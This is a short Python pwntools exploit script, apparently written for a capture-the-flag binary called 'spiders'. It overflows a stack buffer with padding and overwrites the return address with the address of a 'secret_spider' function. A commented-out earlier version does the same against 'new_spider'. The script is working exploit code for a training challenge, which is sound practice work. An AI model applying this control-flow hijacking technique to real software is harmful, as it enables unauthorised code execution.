from pwn import *
import base64

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Set up pwntools for the correct architecture
# exe = './peserta/everything'
# exe = './new_spider'
exe = './spiders'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

offset = 64

payload = flat(
    offset * b'A', 
    elf.symbols.secret_spider,  
    # 0x0,
    # libc.address + 0xe3b01,
)

# io.sendlineafter(b'Item: ', payload, timeout=1)
io.sendline(payload)

io.interactive()

# # import pwntools library
# from pwn import *

# # define head to overflow the buffer and the actual address to send after the head
# head = "A"*72
# address = "\x56\x11\x40"

# # define payload
# payload = head + address

# # launch a process
# p = process("./new_spider")

# # send payload and make it interactive
# p.sendline(payload)
# p.interactive()
